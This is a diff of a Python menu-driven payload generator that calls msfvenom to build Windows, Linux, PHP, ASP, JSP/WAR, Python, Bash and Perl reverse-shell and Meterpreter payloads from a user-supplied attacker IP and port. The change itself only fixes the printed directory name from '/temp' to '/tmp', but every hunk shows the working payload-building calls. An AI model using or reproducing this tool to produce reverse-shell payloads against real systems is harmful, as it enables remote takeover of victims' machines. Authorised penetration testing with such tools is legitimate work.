@@ -42,25 +42,25 @@ def selection():
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "2":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "3":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "4":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                 exit()
             elif select == "2":
@@ -75,25 +75,25 @@ def selection():
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "2":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "3":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "linux/x86/shell/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "4":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "linux/x86/shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
 
             elif select == "3":
@@ -109,32 +109,32 @@ def selection():
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "php/meterpreter_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.php"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "2":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "php/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.php"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "3":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "asp", "-o", "/tmp/payload.asp"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "4":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.jsp"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
 
                     elif select_1 == "5":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "war", "-o", "/tmp/payload.war"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
             
             elif select == "4":
@@ -148,19 +148,19 @@ def selection():
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_python", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.py"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "2":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_bash", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.sh"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
                     elif select_1 == "3":
                         lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                         lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                         subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_perl", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.pl"])
-                        print(termcolor.colored('\nPayload written to /temp directory', 'green', attrs=['bold']))
+                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                         exit()
 
             elif select == "5":
